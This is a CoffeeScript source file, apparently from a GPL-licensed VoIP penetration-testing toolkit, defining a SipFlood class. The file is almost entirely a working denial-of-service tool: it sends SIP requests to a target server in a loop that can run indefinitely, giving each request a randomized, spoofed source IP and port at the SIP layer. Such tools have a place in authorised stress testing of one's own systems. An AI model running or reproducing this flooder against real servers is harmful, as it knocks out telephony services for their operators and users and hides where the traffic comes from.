###

Copyright (C) 2013, Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

###


# ---------------------- Requires --------------------------------

{SipMessage} = require "../tools/sipMessage.coffee"
{AsteroidsConn} = require "../tools/asteroidsConn.coffee"
{Printer} = require "../tools/printer.coffee"
{Utils} = require "../tools/utils.coffee"


# ----------------------- Class ----------------------------------

# This class generates a large amount of SIP traffic against a server.
exports.SipFlood =
class SipFlood

	reqNum = 1
	oneRequest = (target, port, path, srcHost, transport, type) ->
		# Spoofed IP and port (at SIP layer).
		laddress = srcHost or Utils.randomIP()
		lport = Utils.randomPort()

		msgObj = new SipMessage type, "", target, port, laddress, lport, "", "", transport, "", "", "", false, "", "", "", "", "", ""
		msgSend = (String) msgObj.create()
		conn = new AsteroidsConn target, port, path, transport, lport
		
		conn.on "newMessage", (stream) ->

		conn.on "error", (error) ->
		
		# A request is sent.	
		conn.send msgSend
		reqNum += 1
		Printer.highlight "Flooding host "
		Printer.normal "#{target}"
		Printer.highlight " (request number "
		Printer.normal "#{reqNum}"
		Printer.highlight ")\n"
		Printer.removeCursor()


	@run : (target, port, path, srcHost, transport, type, numReq, delay) ->
		Printer.normal "\n"
		doLoopNum = (i) =>
			setTimeout(=>
				oneRequest target, port, path, srcHost, transport, type
				if (i < numReq) or numReq is "infinite"
					doLoopNum(i + 1)
			,delay);
		doLoopNum 1
